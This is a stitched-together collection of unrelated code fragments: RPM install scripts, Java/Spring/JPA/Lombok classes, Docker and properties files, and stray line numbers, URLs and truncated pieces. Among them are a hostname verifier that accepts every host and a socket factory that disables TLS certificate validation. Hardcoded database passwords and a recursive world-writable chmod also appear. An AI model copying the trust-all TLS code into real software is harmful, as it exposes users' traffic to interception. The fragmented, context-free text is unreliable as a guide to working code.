        # older suse linux distributions do not ship with systemd
        # but do not have an /etc/init.d/ directory
        # this tries to start elasticsearch on these as well without failing this script
        if [ -x /etc/init.d/elasticsearch ] ; then
            /etc/init.d/elasticsearch start
        elif [ -x /etc/rc.d/init.d/elasticsearch ] ; then
            /etc/rc.d/init.d/elasticsearch start
        fi
    fi

fi

# only execute in case of package removal, not on upgrade
if [ $1 -eq 0 ] ; then

    getent passwd elasticsearch > /dev/null
    if [ "$?" == "0" ] ; then
        userdel elasticsearch
    fi

    getent group elasticsearch >/dev/null
    if [ "$?" == "0" ] ; then
        groupdel elasticsearch
    fi
fi

exit

getent group elasticsearch >/dev/null || groupadd -r elasticsearch
getent passwd elasticsearch >/dev/null || \
    useradd -r -g elasticsearch -d /usr/share/elasticsearch -s /sbin/nologin \
    -c "elasticsearch user" elasticsearch
	
if [ $1 -eq 0 ] ; then
    # Package removal, not upgrade
    if [ -x /bin/systemctl ] ; then
        /bin/systemctl --no-reload disable elasticsearch.service > /dev/null 2>&1 || :
		/bin/systemctl stop elasticsearch.service > /dev/null 2>&1 || :
    fi

    if [ -x /sbin/chkconfig ] ; then
        if [ -x /etc/init.d/elasticsearch ] ; then
            /etc/init.d/elasticsearch stop
        fi
        /sbin/chkconfig --del elasticsearch 2> /dev/null
    fi
fi

exit 0


--------------------------------------------------------------------------------------------------------
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.time.format.DateTimeParseException;
import java.time.format.FormatStyle;
import java.util.Locale;

import javax.enterprise.context.RequestScoped;
import javax.inject.Inject;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import br.com.caelum.vraptor.Convert;
import br.com.caelum.vraptor.converter.ConversionException;
import br.com.caelum.vraptor.converter.ConversionMessage;
import br.com.caelum.vraptor.converter.Converter;

/**
 * A converter for {@link LocalDateTime}.
 *
 * @author Lucas Cavalcanti
 * @author Otávio Scherer Garcia
 */
@Convert(LocalDateTime.class)
@RequestScoped
public class LocalDateTimeConverter implements Converter<LocalDateTime> {
	private static final Logger logger = LoggerFactory.getLogger(LocalDateTimeConverter.class);

	private final Locale locale;

	/**
	 * @deprecated CDI eyes only
	 */
	protected LocalDateTimeConverter() {
		this(null);
	}

	@Inject
	public LocalDateTimeConverter(Locale locale) {
		this.locale = locale;
	}

	@Override
	public LocalDateTime convert(String value, Class<? extends LocalDateTime> type) {
		if (isNullOrEmpty(value)) {
			return null;
		}
		logger.debug("LocalDateTimeValue: " + value);
		System.out.println("LocalDateTimeValue: " + value);
		try {
			return LocalDateTime.parse(value, getFormatter());
		} catch (DateTimeParseException e) {
//			throw new ConversionException(new ConversionMessage("is_not_a_valid_datetime", value));
			return LocalDateTime.parse(value, DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm", locale));
		}
	}

	protected DateTimeFormatter getFormatter() {
		return DateTimeFormatter.ofLocalizedDateTime(FormatStyle.MEDIUM).withLocale(locale);
	}
}
--------------------------------------------------------------------------------------------------------
@Fetch(FetchMode.SUBSELECT)
	@ElementCollection(fetch=FetchType.EAGER,targetClass = Role.class)
	@CollectionTable(name = "account_roles", joinColumns = @JoinColumn(name = "account_id", referencedColumnName = "id") )
	@Column(name = "role", length = 15)
	@Enumerated(EnumType.STRING)
	private Set<Role> roles;
--------------------------------------------------------------------------------------------------------
   @Convert(converter = LocalDateTimeAttributeConverter.class)
    @Column(length = 5, name = "data_hora_envio")
    private LocalDateTime dateHoraDeEnvio;
--------------------------------------------------------------------------------------------------------
import javax.persistence.Column;
import javax.persistence.ElementCollection;
import javax.persistence.Entity;
import javax.persistence.EnumType;
import javax.persistence.Enumerated;
import javax.persistence.NamedQueries;
import javax.persistence.NamedQuery;
import javax.persistence.Table;

import org.apache.commons.lang3.builder.EqualsBuilder;
import org.apache.commons.lang3.builder.HashCodeBuilder;
import org.hibernate.annotations.SQLDelete;
import org.hibernate.annotations.Where;

@Entity
@Table(name = "usuarios")
@NamedQueries(@NamedQuery(name = "Usuario.buscaPorEmail", query = "select u from Usuario u where u.email = :email"))
@Where(clause = "deletado = 0")
@SQLDelete(sql = "update usuarios set deletado = 1 where id = ?")
public class Usuario extends Entidade {
--------------------------------------------------------------------------------------------------------
	public Optional<Account> isValidToken(String token) {
		ChangeToken change = new ChangeToken();
		change.setJwt(token);
		return isValidToken(change);
	}

	public Optional<Account> isValidToken(ChangeToken token) {

		final Claims claims = Jwts.parser().setSigningKey(PasswordEncryptionService.RANDOM_KEY)
				.parseClaimsJws(token.getJwt()).getBody();

		String uuid = (String) claims.get("uuid");
		Account account = service.getAccount(uuid);

		return Optional.ofNullable(account);
	}

	public ChangeToken createToken(Account account) {
		Instant instant = new Date().toInstant();
		Instant validatedAt = instant.plus(Duration.ofHours(1));
		Date date = Date.from(validatedAt);

		String jwt = Jwts.builder().setSubject(account.getEmail()).claim("uuid", account.getUuid())
				.setIssuedAt(new Date()).setExpiration(date)
				.signWith(SignatureAlgorithm.HS256, PasswordEncryptionService.RANDOM_KEY).compact();
		return new ChangeToken(account.getUuid(), account.getEmail(), jwt);
	}
--------------------------------------------------------------------------------------------------------
nes (20 sloc) 1.79 KB
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.description = Format without decimal dates
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.name = Format without decimal

com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.number.description = Number to be formatted
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.number.name = Number

com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.prefix.description = Number Prefix
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.prefix.name = Prefix to be used before the number

com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.suffix.description = Number Suffix
com.fred.functions.CustomFunctions.FORMAT_WITHOUT_DECIMAL.suffix.name = Suffix to be used before the number

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.description = Format without decimal dates
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.name = Format without decimal

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.number.description = Number to be formatted
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.number.name = Number

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.scale.description = Scale
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.scale.name = Fixs to be used in format

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.prefix.description = Number Prefix
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.prefix.name = Prefix to be used before the number

com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.suffix.description = Number Suffix
com.fred.functions.CustomFunctions.FORMAT_WITH_DECIMAL.suffix.name = Suffix to be used before the number

com.fred.functions.FredCustomFunctions.name=Fred Custom Functions
com.fred.functions.FredCustomFunctions.description=Custon functions
--------------------------------------------------------------------------------------------------------
    @Override
    public boolean equals(final Object other) {
	if (!(other instanceof PessoaJuridica)) {
	    return false;
	}
	PessoaJuridica castOther = (PessoaJuridica) other;
	return new EqualsBuilder().append(nomeFantasia, castOther.nomeFantasia)
		.append(razaoSocial, castOther.razaoSocial).append(cnpj, castOther.cnpj)
		.append(inscricaoEstadual, castOther.inscricaoEstadual).isEquals();
    }

    @Override
    public int hashCode() {
	return new HashCodeBuilder().append(nomeFantasia).append(razaoSocial).append(cnpj).append(inscricaoEstadual)
		.toHashCode();
    }
--------------------------------------------------------------------------------------------------------
import com.edu.fatecbt.sistema.controle.AppUrls;
import com.edu.fatecbt.sistema.controle.ServletBase;
import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = "LoginServlet", urlPatterns = {AppUrls.USUARIO_LOGIN})
public class LoginServlet extends ServletBase {

    private UsuarioService service;

    @Override
    public void init() throws ServletException {
        super.init();
        service = new UsuarioService();
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String login = request.getParameter("login");
        String senha = request.getParameter("senha");
        boolean ehUsuarioLogado = service
                .ehUsuarioLogado(login, senha, request.getSession());
        if (ehUsuarioLogado) {
            redirect("/main", response);
        } else {
            request.getSession().setAttribute("errorMessage", "Usuário não autenticado");
            redirect("/index.jsp", response);
        }
    }

}
--------------------------------------------------------------------------------------------------------
private void exercise7() throws IOException {
		try (BufferedReader reader = Files.newBufferedReader(Paths.get("SonnetI.txt"), StandardCharsets.UTF_8)) {
			/* YOUR CODE HERE */
			reader.lines()
				.flatMap(l -> Stream.of(l.split(WORD_REGEXP)))
				.distinct()
				.map(String::toLowerCase)
				.sorted((a,b) -> Integer.compare(a.length(), b.length()))
				.collect(Collectors.toList())
				.forEach(System.out::println);
		}
	}

--------------------------------------------------------------------------------------------------------
# Add project specific ProGuard rules here.
# You can control the set of applied configuration files using the
# proguardFiles setting in build.gradle.
#
# For more details, see
#   http://developer.android.com/guide/developing/tools/proguard.html

# If your project uses WebView with JS, uncomment the following
# and specify the fully qualified class name to the JavaScript interface
# class:
#-keepclassmembers class fqcn.of.javascript.interface.for.webview {
#   public *;
#}

# Uncomment this to preserve the line number information for
# debugging stack traces.
#-keepattributes SourceFile,LineNumberTable

# If you keep the line number information, uncomment this to
# hide the original source file name.
#-renamesourcefileattribute SourceFile
--------------------------------------------------------------------------------------------------------
import com.leonardoz.select_html.parser.ast.projection.*;

public class ProjectionResultExtractorListener implements ExtractorListener {

    private ProjectionResult result;

    public ProjectionResultExtractorListener() {
        result = new ProjectionResult();
    }

    @Override
    public void onTagCreated(Tag tag) {
        result.setTag(tag);
    }

    @Override
    public void onTagAttributesCreated(TagAttributes tagAttributes) {
        result.setTagAttributes(tagAttributes);
    }

    @Override
    public void onTagClassesCreated(TagClasses tagClasses) {
        result.setTagClasses(tagClasses);
    }

    @Override
    public void onTagIdCreated(TagId tagId) {
        result.setTagId(tagId);
    }

    @Override
    public void onTagHTMLCreated(TagHTML tagHTML) {
        result.setTagHtml(tagHTML);
    }

    @Override
    public void onTagTextCreated(TagText tagText) {
        result.setTagText(tagText);
    }

    public ProjectionResult getResult() {
        return result;
    }
}
--------------------------------------------------------------------------------------------------------
	@ManyToOne(optional = false)
	@JoinColumn(name = "id_autor")
	private Autor autor;

	@NotEmpty
	@Size(min = 1, max = 140)
	@Column(length = 140, nullable = false, name = "titulo")
	private String titulo;

	@NotEmpty
	@Size(min = 1)
	@Column(columnDefinition = "text", nullable = false, name = "conteudo")
	private String conteudo;

	@Temporal(TemporalType.TIMESTAMP)
	@Column(name = "data")
	private Date data;

	@NotEmpty
	@ManyToMany(cascade = { CascadeType.MERGE, CascadeType.PERSIST,
			CascadeType.REFRESH })
	@JoinTable(name = "post_categoria", joinColumns = @JoinColumn(name = "id_post"), inverseJoinColumns = @JoinColumn(name = "id_categoria"))
	private List<Categoria> categorias;

	@OneToMany(mappedBy = "post")
	private List<Comentario> comentarios;
	
	@NotEmpty
	@Size(max = 12)
	@Column(length = 12, nullable = false, unique = true, name = "nick")
	private String nick;

	@NotEmpty
	@Size(max = 40)
	@Column(length = 40, nullable = false, name = "nome_completo")
	private String nomeCompleto;

	@NotEmpty
	@Email
	@Column(length = 35, nullable = false, unique = true, name = "email")
	private String email;

	@NotEmpty
	@Size(min = 3, max = 64)
	@Column(length = 64, nullable = false, name = "hash_senha")
	private String hashSenha;

	@Temporal(TemporalType.DATE)
	@Column(nullable = false, name = "cadastrado")
	private Date cadastrado;
--------------------------------------------------------------------------------------------------------
docker-compose.yml

version: '3'

services:
  app:
    container_name: blogleo_app
    restart: always
    build: 
      context: ../
      dockerfile: ./docker/SpringDockerfile 
    working_dir: /app
    networks: 
      - backend
    volumes:
      - ../:/app
      - ~/.m2:/root/.m2
    ports:
      - 8080:8080
    stdin_open: true
    tty: true
    entrypoint: 
      - bash 
      - -c
      - |
          mvn package 
          sh target/bin/blogleo
    depends_on:
      - mysql_db

  mysql_db:
    container_name: blogleo_db
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: 'blogpass'
      MYSQL_DATABASE: 'blogleo'
      MYSQL_USER: 'user'
      MYSQL_PASSWORD: 'blogpass'
    networks:
      - backend
    volumes:
      - ./mysql-data/:/var/lib/mysql
      - ./mysql-conf/:/docker-entrypoint-initdb.d
    ports:
     - "3306:3306"
     
networks:
  backend:
    driver: bridge
--------------------------------------------------------------------------------------------------------
import java.net.URL;
import java.time.Duration;
import java.time.Instant;

import lombok.EqualsAndHashCode;
import lombok.Getter;
import lombok.NonNull;
import lombok.RequiredArgsConstructor;
import lombok.experimental.Accessors;

@RequiredArgsConstructor
@Accessors(fluent = true) @Getter
@EqualsAndHashCode(of = {"authToken"})
public class LoginResult {

    private final @NonNull Instant loginTs;

    private final @NonNull String authToken;
    private final @NonNull Duration tokenValidity;

    private final @NonNull URL tokenRefreshUrl;

}
--------------------------------------------------------------------------------------------------------
import lombok.AccessLevel;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;
import lombok.ToString;
import lombok.experimental.Delegate;

@Entity
@Getter @Setter @NoArgsConstructor // <--- THIS is it
@ToString(exclude = {"events"})
public class User implements Serializable, HasContactInformation {

    private @Id @Setter(AccessLevel.PROTECTED) Long id; // will be set when persisting

    private String nickname;

    // Whichever other User-specific attributes

    @Delegate(types = {HasContactInformation.class})
    private final ContactInformationSupport contactInformation = new ContactInformationSupport();

    // User itelf will implement all contact information by delegation

    @OneToMany(mappedBy = "user")
    private List<UserEvent> events;

    public User(String nickname, String firstName, String lastName, String phoneNr) {
        this.nickname = nickname;
        contactInformation.setFirstName(firstName);
        contactInformation.setLastName(lastName);
        contactInformation.setPhoneNr(phoneNr);
    }

}

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.stream.Collectors;

import lombok.SneakyThrows;
import lombok.Synchronized;

public class Utility {

    @SneakyThrows
    public String resourceAsString() throws IOException {
        try (InputStream is = this.getClass().getResourceAsStream("sure_in_my_jar.txt")) {
            BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
            return br.lines().collect(Collectors.joining("\n"));
        } 
    }

    @Synchronized
    public void putValueInCache(String key, String value) {
        System.out.println("Thread safe here with key : [" + key + "] and value[" + value + "]");
    }
}

import lombok.Builder;
import lombok.Getter;

@Getter
public class Student extends Child {

    private final String schoolName;

    @Builder(builderMethodName = "studentBuilder")
    public Student(String parentName, int parentAge, String childName, int childAge, String schoolName) {
        super(parentName, parentAge, childName, childAge);
        this.schoolName = schoolName;
    }
}
import java.util.List;
import lombok.Builder;
import lombok.Getter;
import lombok.Singular;

@Getter
@Builder
public class Sea {

    @Singular private final List<String> grasses;
    @Singular("oneFish") private final List<String> fish;
}
--------------------------------------------------------------------------------------------------------
@OverridesAttribute(constraint = Size.class, name = "min")
@OverridesAttribute(constraint = Size.class, name = "max")
int size() default 5;
@OverridesAttribute(constraint = Size.class, name = "message")
String sizeMessage() default "A french zip code has a length of 5";
@OverridesAttribute(constraint = Pattern.class, name = "regexp", constraintIndex = 1)
String regex() default "\\d*";
--------------------------------------------------------------------------------------------------------
import lombok.Builder;
import lombok.Getter;
import lombok.Singular;

import java.time.LocalDate;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.Set;

@Getter
@Builder
public class Person {

    private final String givenName;
    private final String additionalName;
    private final String familyName;

    private final List<String> tags;
    @Singular private final List<String> interests;
    @Singular private final Set<String> skills;
    @Singular private final Map<String, LocalDate> awards;
}
--------------------------------------------------------------------------------------------------------
@Configuration
class ConnectionFactoryConfiguration {

	@Bean
	DatabaseClient databaseClient() {
		return DatabaseClient.create(connectionFactory());
	}

	@Bean
	public ConnectionFactory connectionFactory() {
		MssqlConnectionConfiguration config = MssqlConnectionConfiguration.builder() //
			.host("localhost")
			.port(1434)
			.database("pizza")
			.username("test")
			.password("test")
			.build();
		return new MssqlConnectionFactory(config);
	}
}
--------------------------------------------------------------------------------------------------------
@Repository
public class ManualPizzaRepository {

    private final ConnectionFactory connectionFactory;

    public ManualPizzaRepository(ConnectionFactory connectionFactory) {
        this.connectionFactory = connectionFactory;
    }

    Mono<Void> deleteById(Integer id) {
        return this.connection()
            .flatMapMany(c -> c.createStatement("delete from pizza where id = $1")
                .bind("$1", id)
                .execute())
            .then();
    }

    Flux<Pizza> findAll() {
        return this.connection()
            .flatMapMany(connection ->
                Flux.from(connection.createStatement("select * from pizza").execute())
                    .flatMap(r ->
                        r.map((row, rowMetadata) ->
                            new Pizza(row.get("id", Integer.class), row.get("flavor", String.class)))));
    }

    Flux<Pizza> save(Pizza pizza) {
        Flux<? extends Result> flux = this.connection().flatMapMany(conn -> conn.createStatement("insert into pizza (flavor) values ($1)")
            .bind("$1", pizza.getFlavor())
            .add()
            .execute());

        return flux.switchMap(x -> Flux.just(new Pizza(pizza.getId(), pizza.getFlavor())));
    }

    private Mono<Connection> connection() {
        return Mono.from(this.connectionFactory.create());
    }

}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {ConnectionFactoryConfiguration.class, ManualPizzaRepository.class})
public class ReactiveSqlSqlserverApplicationTests {

	@Autowired
	ManualPizzaRepository pizzas;

	@Autowired
	DatabaseClient databaseClient;

	@Test
	public void testAllManual() {
		Flux<Void> deleteAll = this.pizzas.findAll().flatMap(pizza -> this.pizzas.deleteById(pizza.getId()));
		StepVerifier.create(deleteAll).expectNextCount(0).verifyComplete();

		Flux<Pizza> savePizzas = Flux.just("Mozzarella", "Pepperoni", "Margherita")
			.map(flavor -> new Pizza(null, flavor))
			.flatMap(pizza -> this.pizzas.save(pizza));
		StepVerifier.create(savePizzas).expectNextCount(3).verifyComplete();

		Flux<Pizza> findAll = this.pizzas.findAll();
		StepVerifier.create(findAll).expectNextCount(3).verifyComplete();

	}
}
--------------------------------------------------------------------------------------------------------
/**
 * @author Guillaume Smet
 */
public class FrenchAddressListContainer extends Address {

  @Override
  @FrenchZipcodeListContainer
  public String getZipCode() {
    return super.getZipCode();
  }

  @NotEmpty
  @Size
  // first pattern just duplicates the length of 5 characters, the second pattern is just to prove that parameters can be overridden.
  @Pattern.List({ @Pattern(regexp = "....."), @Pattern(regexp = "bar") })
  @Constraint(validatedBy = FrenchZipcodeListContainerConstraintValidator.class)
  @Documented
  @Target({ METHOD, FIELD, TYPE })
  @Retention(RUNTIME)
  public @interface FrenchZipcodeListContainer {
    String message() default "Wrong zipcode";

    Class<?>[] groups() default { };

    Class<? extends Payload>[] payload() default {};

    @OverridesAttribute(constraint = Size.class, name = "min")
    @OverridesAttribute(constraint = Size.class, name = "max")
    int size() default 5;

    @OverridesAttribute(constraint = Size.class, name = "message")
    String sizeMessage() default "A french zip code has a length of 5";

    @OverridesAttribute(constraint = Pattern.class, name = "regexp", constraintIndex = 1)
    String regex() default "\\d*";
  }
}
--------------------------------------------------------------------------------------------------------
public final class WeightBean {
    @NotNull
    private Double txtWeight;  //Getter and setter.

    @AssertTrue
    public boolean getTxtWeightCheck() {
        return txtWeight > 0.1 && txtWeight < 0.9;
    }
}
--------------------------------------------------------------------------------------------------------
        this.objectMapper.registerModule(
                new SimpleModule("Axon-Jackson Module").addDeserializer(MetaData.class, new MetaDataDeserializer())
        );
--------------------------------------------------------------------------------------------------------
/**
 * Default IdentifierFactory implementation that uses generates random {@code java.util.UUID} based identifiers.
 * Although the performance of this strategy is not the best out there, it has native supported on all JVMs.
 * <p/>
 * This implementations selects a random identifier out of about 3 x 10<sup>38</sup> possible values, making the chance
 * to get a duplicate incredibly small.
 *
 * @author Allard Buijze
 * @since 1.2
 */
public class DefaultIdentifierFactory extends IdentifierFactory {

    /**
     * {@inheritDoc}
     * <p/>
     * This implementation creates identifiers based on pseudo-random UUIDs.
     */
    @Override
    public String generateIdentifier() {
        return UUID.randomUUID().toString();
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@EnableMBeanExport(registration = RegistrationPolicy.IGNORE_EXISTING)
@ContextConfiguration(locations = "classpath:/META-INF/spring/insertion-read-order-test-context.xml")
public class JpaStorageEngineInsertionReadOrderTest {
--------------------------------------------------------------------------------------------------------
jdbc.driverclass=org.hsqldb.jdbcDriver
jdbc.url=jdbc:hsqldb:mem:addressbook
jdbc.username=sa
jdbc.password=
hibernate.sql.dialect=org.hibernate.dialect.HSQLDialect
hibernate.sql.generateddl=true
javax.schema.generation=drop-and-create
hibernate.sql.show=false

jdbc.driverclass=com.mysql.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/axon_benchmark?useUnicode=true&characterEncoding=utf8&characterSetResults=utf8&rewriteBatchedStatements=true
jdbc.username=build
jdbc.password=build
hibernate.sql.dialect=org.hibernate.dialect.MySQL5InnoDBDialect
javax.schema.generation=drop-and-create
hibernate.sql.show=false

jdbc.driverclass=com.mysql.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/axon?useUnicode=true&characterEncoding=utf8&characterSetResults=utf8
jdbc.username=build
jdbc.password=build
hibernate.sql.dialect=org.hibernate.dialect.MySQL5InnoDBDialect
hibernate.sql.generateddl=true
hibernate.sql.show=true
--------------------------------------------------------------------------------------------------------
            <plugins>
                <plugin>
                    <!--
                        Creates a report by running "mvn japicmp:cmp"
                        Note: you need to install the jars before running the japicmp command.
                    -->
                    <groupId>com.github.siom79.japicmp</groupId>
                    <artifactId>japicmp-maven-plugin</artifactId>
                    <version>0.9.3</version>
                    <configuration>
                        <oldVersion>
                            <dependency>
                                <groupId>${project.groupId}</groupId>
                                <artifactId>${project.artifactId}</artifactId>
                                <version>1.1.0.Final</version>
                            </dependency>
                        </oldVersion>
                        <newVersion>
                            <file>
                                <path>${project.build.directory}/${project.artifactId}-${project.version}.${project.packaging}</path>
                            </file>
                        </newVersion>
                        <parameter>
                            <onlyModified>true</onlyModified>
                        </parameter>
                    </configuration>
                </plugin>
            </plugins>
--------------------------------------------------------------------------------------------------------
FROM haskell:7.10.3
MAINTAINER Andrey Somov <public.somov@gmail.com>

ENV YAML_REF=YamlReference-0.10.0

RUN apt-get update && apt-get install -y \
   build-essential \
   ca-certificates \
   less            \
   netbase         \
   vim

# install YamlReference
ADD http://hackage.haskell.org/package/${YAML_REF}/${YAML_REF}.tar.gz ${YAML_REF}.tar.gz 
RUN tar xvzf ${YAML_REF}.tar.gz

# add yeast2html to PATH
ENV PATH=${PATH}:/${YAML_REF}

WORKDIR /${YAML_REF}
#RUN stack upgrade
RUN stack setup && stack init && stack build && stack install

RUN cp /root/.local/bin/yaml2yeast ./yaml2yeast -R
RUN chmod o=rwx --recursive /${YAML_REF}

CMD ["bash"]
--------------------------------------------------------------------------------------------------------
 public String toString()
  {
    return ToStringBuilder.reflectionToString(this, ToStringStyle.MULTI_LINE_STYLE);
  }
--------------------------------------------------------------------------------------------------------
    protected Class<?> getClassForName(String name) throws ClassNotFoundException {
        try {
            return Class.forName(name, true, Thread.currentThread().getContextClassLoader());
        } catch (ClassNotFoundException e) {
            return Class.forName(name);
        }
    }
--------------------------------------------------------------------------------------------------------
/* We need a constructor to tell SnakeYaml that the type parameter of
 * the 'name' List is String
 * (SnakeYAML cannot figure it out itself due to type erasure)
 */
Constructor constructor = new Constructor(Config.class);
TypeDescription configDesc = new TypeDescription(Config.class);
configDesc.putListPropertyType("name", String.class);
constructor.addTypeDescription(configDesc);

// Now we use our constructor to tell SnakeYAML how to load the YAML
Yaml yaml = new Yaml(constructor);
Config config = yaml.loadAs(in, Config.class);

// You can now easily access your strings
List<String> values = config.name;

class Config {
    public List<String> name;
}
--------------------------------------------------------------------------------------------------------
@Test
public void whenCollectorsJoining_thenPrintCustom() {
    List<Integer> intList = Arrays.asList(1, 2, 3);
    String result = intList.stream()
      .map(n -> String.valueOf(n))
      .collect(Collectors.joining("-", "{", "}"));
  
    System.out.println(result);
}
--------------------------------------------------------------------------------------------------------
package org.afc.petstore.ssl;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;

public class AcceptAllHostnameVerifier implements HostnameVerifier {

	@Override
	public boolean verify(String hostname, SSLSession session) {
		return true;
	}
}
--------------------------------------------------------------------------------------------------------
package org.afc.petstore.ssl;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;

import org.springframework.cloud.commons.httpclient.OkHttpClientFactory;

public class SSLSocketFactoryUtil {

	public static SSLSocketFactory newAcceptAll() {
		try {
			TrustManager[] tm = new TrustManager[] { new OkHttpClientFactory.DisableValidationTrustManager() };
			SSLContext context = SSLContext.getInstance("TLS");
			context.init(null, tm, null);
			return context.getSocketFactory();
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
}
--------------------------------------------------------------------------------------------------------
MetricsAutoConfiguration
philandro software

--------------------------------------------------------------------------------------------------------
package org.afc.petstore;

import org.afc.env.Environment;
import org.afc.util.ClasspathUtil;

public class PetstoreLocal {

	public static void main(String[] args) throws Exception {
		Environment.set("petstore", "local", "vi", "default", "vi1");
		ClasspathUtil.addSystemClasspath("target/config");
		Petstore.main(new String[] {"--spring.profiles.active=local,default,vi,vi1"});
	}
}
--------------------------------------------------------------------------------------------------------
git branch -D PBA-4653
https://global-hotspot.ru/wi-fi-targeting-reklamy/
https://target.my.com/
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class) 
@ContextConfiguration(classes = AppConfig.class)
@WebAppConfiguration
public class SpringTest {
}
--------------------------------------------------------------------------------------------------------
@Configuration
@ConditionalOnClass(Flyway.class)
@ConditionalOnBean(DataSource.class)
@ConditionalOnExpression("${flyway.enabled:true}")
@AutoConfigureAfter(DataSourceAutoConfiguration.class)
public class FlywayAutoConfiguration {

    @Configuration
    @ConditionalOnMissingBean(Flyway.class)
    @EnableConfigurationProperties(FlywayProperties.class)
    @Import(FlywayJpaDependencyConfiguration.class)
    public static class FlywayConfiguration {
--------------------------------------------------------------------------------------------------------

2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
package com.spring.configuration;
 
import org.hibernate.SessionFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.*;
import org.springframework.core.env.Environment;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.orm.hibernate5.HibernateTransactionManager;
import org.springframework.orm.hibernate5.LocalSessionFactoryBean;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
import org.springframework.web.servlet.view.InternalResourceViewResolver;
import org.springframework.web.servlet.view.JstlView;
 
import javax.sql.DataSource;
import java.util.Properties;
 
@Configuration
@EnableWebMvc  //здесь
@EnableTransactionManagement
@ComponentScan(
        basePackages = { "com.spring" },
        excludeFilters = { @ComponentScan.Filter(
                type = FilterType.ANNOTATION,
                value = Configuration.class)}
)
@PropertySource(value = {"classpath:application.properties"})
public class WebConfiguration extends WebMvcConfigurerAdapter {
    @Autowired
    private Environment environment;
 
    @Override  //ну или здесь
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("/resources/**").addResourceLocations("/resources/");
    }
 
    @Bean
    public InternalResourceViewResolver setupViewResolver() {
        InternalResourceViewResolver resolver = new InternalResourceViewResolver();
        resolver.setPrefix("/WEB-INF/views/");
        resolver.setSuffix(".jsp");
        resolver.setViewClass(JstlView.class);
 
        return resolver;
    }
 
    @Bean
    public LocalSessionFactoryBean sessionFactory() {
        LocalSessionFactoryBean sessionFactory = new LocalSessionFactoryBean();
        sessionFactory.setDataSource(dataSource());
        sessionFactory.setPackagesToScan("com.spring.model");  //new String[] { "com.spring.model" }
        sessionFactory.setHibernateProperties(hibernateProperties());
        return sessionFactory;
    }
 
    @Bean
    public DataSource dataSource() {
        DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(environment.getRequiredProperty("jdbc.driverClassName"));
        dataSource.setUrl(environment.getRequiredProperty("jdbc.url"));
        dataSource.setUsername(environment.getRequiredProperty("jdbc.username"));
        dataSource.setPassword(environment.getRequiredProperty("jdbc.password"));
        return dataSource;
    }
 
    private Properties hibernateProperties() {
        Properties properties = new Properties();
        properties.put("hibernate.dialect", environment.getRequiredProperty("hibernate.dialect"));
        properties.put("hibernate.show_sql", environment.getRequiredProperty("hibernate.show_sql"));
        properties.put("hibernate.format_sql", environment.getRequiredProperty("hibernate.format_sql"));
        properties.put("hibernate.hbm2ddl.auto", "update");
        properties.put(
                "log4j.logger.org.hibernate.SQL",
                environment.getRequiredProperty("log4j.logger.org.hibernate.SQL")
        );
        properties.put(
                "log4j.logger.org.hibernate.type",
                environment.getRequiredProperty("log4j.logger.org.hibernate.type")
        );
        return properties;
    }
 
    @Bean
    @Autowired
    public HibernateTransactionManager transactionManager(SessionFactory s) {
        HibernateTransactionManager txManager = new HibernateTransactionManager();
        txManager.setSessionFactory(s);
        return txManager;
    }
}
pom.xml
XML
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
